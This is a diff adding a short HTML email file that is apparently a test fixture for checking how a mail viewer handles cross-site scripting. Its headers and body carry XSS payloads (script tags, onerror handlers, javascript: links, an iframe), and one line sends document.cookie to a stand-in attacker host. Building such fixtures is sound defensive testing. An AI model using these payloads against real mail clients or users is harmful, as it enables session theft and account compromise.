@@ -1,0 +1,16 @@
+From: "Attacker <script>alert(1)</script>" <attacker@malicious-xss.com>
+To: victim@company.com
+Subject: Notice: Account Review <img src="x" onerror="alert('XSS-SUBJECT')">
+Date: Wed, 20 Mar 2024 12:00:00 +0000
+Content-Type: text/html; charset="UTF-8"
+Received: from mail.attacker.com ([185.220.101.5]) by mx.victim.com with SMTP; Wed, 20 Mar 2024 12:00:05 +0000
+
+<html>
+<body>
+<h1>Urgent Account Update</h1>
+<p>Click here to verify: <a href="javascript:alert('XSS-BODY')">Verify Account</a></p>
+<script>alert('DOCUMENT-COOKIE-THEFT');</script>
+<img src="https://attacker.com/log" onerror="fetch('http://attacker.com/steal?c='+document.cookie)" />
+<iframe src="javascript:alert('IFRAME-XSS')"></iframe>
+</body>
+</html>
